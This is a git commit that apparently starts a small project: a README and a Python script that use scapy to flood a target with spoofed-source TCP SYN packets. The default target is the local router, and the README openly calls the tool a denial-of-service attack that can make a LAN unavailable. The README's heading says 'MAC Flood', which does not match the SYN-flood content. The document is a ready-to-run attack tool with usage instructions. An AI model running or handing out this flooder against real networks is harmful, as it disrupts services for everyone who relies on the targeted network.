6c9f3bb90f39f9cfba2a27cf7d2a7a02e0a5330c
savasick <savasick@proton.me>
2024-09-23 17:53:00 +0300

    Init

---
+++ README.md
@@ -0,0 +1,25 @@
+# MAC Flood
+
+This Python script is designed to perform a SYN Flood attack, which is a type of Denial-of-Service (DoS) attack that involves sending numerous SYN packets to a specified target IP address and port.
+
+### install
+
+```bash
+git clone https://github.com/savasick/synflood.git
+cd synflood
+python3 -m venv venv
+source venv/bin/activate
+pip3 install -r requirements.txt
+```
+
+### usage
+
+send to router-IP 80-port (Can disrupt LAN network and make it unavailable)
+```bash
+sudo python3 synflood.py
+```
+
+send to 192.168.5.110-IP 443-port
+```bash
+sudo python synflood.py 192.168.5.110 443
+```
---
+++ synflood.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python
+
+import sys
+import os
+sys.stderr = None 
+from scapy.all import *
+sys.stderr = sys.__stderr__
+import netifaces
+import time
+
+def check_root():
+    if os.geteuid() != 0:
+        print("Script must run as root")
+        sys.exit(1)
+
+def get_gateway_ip():
+    try:
+        gateways = netifaces.gateways()
+        default_gateway = gateways['default'][netifaces.AF_INET][0]
+        return default_gateway
+    except (KeyError, IndexError):
+        return None
+
+def syn_flood(dest_ip, dest_port):
+    s_addr = RandIP()
+    packet = IP(src= s_addr, dst=dest_ip) / TCP(sport=RandShort(), dport=dest_port, seq=1505066, flags="S")
+    send(packet, verbose=0)
+
+
+def main():
+    check_root()
+
+    victim_ip = sys.argv[1] if len(sys.argv) > 1 else get_gateway_ip()
+    victim_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+
+    print("Start SYN flood")
+    print("Target IP:", victim_ip)
+    print("Target PORT:", victim_port)
+    try:
+        print("To stop press CTRL+C")
+        while True:
+            syn_flood(victim_ip, victim_port)
+            time.sleep(0.01)
+    except KeyboardInterrupt:
+        print("\nSYN flood stoped")
+
+if __name__ == "__main__":
+    main()
